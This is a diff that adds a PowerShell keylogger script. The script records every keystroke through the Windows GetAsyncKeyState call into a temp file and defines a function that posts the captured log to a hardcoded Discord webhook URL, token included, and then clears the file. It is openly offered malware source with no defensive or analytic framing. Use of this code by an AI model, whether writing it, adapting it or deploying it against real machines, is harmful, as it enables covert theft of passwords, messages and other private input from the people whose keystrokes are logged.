@@ -1,1 +1,44 @@
-1
+# Keylogger and Send Logs to Discord
+function Start-Keylogger {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win32 {
+        [DllImport("user32.dll")]
+        public static extern short GetAsyncKeyState(int vKey);
+    }
+"@
+    $logPath = "$env:TEMP\keylog.txt"
+    while ($true) {
+        Start-Sleep -Milliseconds 100
+        foreach ($char in 1..255) {
+            if ([Win32]::GetAsyncKeyState($char) -eq -32767) {
+                $key = ""
+                if ($char -ge 65 -and $char -le 90) { $key = [char]$char }
+                else {
+                    switch ($char) {
+                        8 { $key = "[BACK]" }
+                        9 { $key = "[TAB]" }
+                        13 { $key = "[ENTER]" }
+                        32 { $key = " " }
+                        default { $key = "[UNK-$(char)$char]" }
+                    }
+                }
+                Add-Content -Path $logPath -Value $key
+            }
+        }
+    }
+}
+
+function Send-LogsToDiscord {
+    $webhook = "https://discord.com/api/webhooks/1243540781654999122/Z4JLrEvIfzLrZI97FEj86brTEnGbY1W69as2qVD5bLKr5NLHyUjmN7WW1YZIDO1Fk8e0"
+    $logPath = "$env:TEMP\keylog.txt"
+    if (Test-Path $logPath) {
+        $content = Get-Content -Path $logPath -Raw
+        $json = @{"content" = $content} | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json"
+        Clear-Content -Path $logPath
+    }
+}
+
+Start-Keylogger
